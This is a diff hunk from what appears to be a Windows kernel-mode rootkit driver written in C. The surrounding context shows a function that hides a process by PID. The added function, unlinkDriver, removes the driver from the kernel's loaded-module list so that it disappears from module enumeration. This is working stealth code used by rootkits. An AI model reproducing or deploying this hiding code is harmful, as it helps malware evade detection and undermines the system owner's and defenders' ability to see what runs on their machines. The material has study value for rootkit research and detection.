@@ -629,6 +629,26 @@ NTSTATUS procHiding(DWORD pidVal, DWORD offset) {
     DbgPrintEx(0, 0, "[%s] Successfully hid process PID %lu\n", DRIVER_NAME, pidVal);
     return STATUS_SUCCESS;
 }
+
+NTSTATUS unlinkDriver(PDRIVER_OBJECT DriverObject) {
+	PMODULE_ENTRY prevModule, nextModule, currentModule;
+
+	currentModule = (PMODULE_ENTRY)DriverObject->DriverSection;
+	prevModule = (PMODULE_ENTRY)currentModule->InLoadOrderLinks.Blink;
+	nextModule = (PMODULE_ENTRY)currentModule->InLoadOrderLinks.Flink;
+
+	DbgPrintEx(0, 0, "[%s] Unlinking driver %wZ\n", DRIVER_NAME, &DriverObject->DriverName);
+	prevModule->InLoadOrderLinks.Flink = currentModule->InLoadOrderLinks.Flink;
+	nextModule->InLoadOrderLinks.Blink = currentModule->InLoadOrderLinks.Blink;
+
+	currentModule->InLoadOrderLinks.Flink = (PLIST_ENTRY)currentModule;
+	currentModule->InLoadOrderLinks.Blink = (PLIST_ENTRY)currentModule;
+
+	DbgPrintEx(0, 0, "[%s] Successfully unlinked driver %wZ\n", DRIVER_NAME, &DriverObject->DriverName);
+
+	return STATUS_SUCCESS;
+}
+
 UINT64 FindKernelBase() {
     UNICODE_STRING functionName;
     PFN_ZwQuerySystemInformation querySysInfo;
